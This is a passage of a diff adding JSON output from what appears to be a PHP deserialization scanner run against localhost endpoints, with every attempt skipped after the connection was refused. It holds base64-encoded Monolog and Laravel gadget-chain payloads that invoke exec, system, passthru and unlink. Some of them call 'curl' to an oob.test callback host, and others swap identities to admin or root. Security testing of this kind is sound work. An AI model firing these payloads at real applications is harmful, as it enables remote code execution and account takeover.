+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2FiOGRkNmE2NzNmOS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2FiOGRkNmE2NzNmOS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2FiOGRkNmE2NzNmOS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9hYjhkZDZhNjczZjkub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vYWI4ZGQ2YTY3M2Y5Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2FiOGRkNmE2NzNmOS5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/export-prefs",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 2,
+      "oob_token": "cc6b40ce22f8",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2NjNmI0MGNlMjJmOC5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2NjNmI0MGNlMjJmOC5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2NjNmI0MGNlMjJmOC5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9jYzZiNDBjZTIyZjgub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vY2M2YjQwY2UyMmY4Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2NjNmI0MGNlMjJmOC5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/export-yaml",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 2,
+      "oob_token": "d1e180e9a90b",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
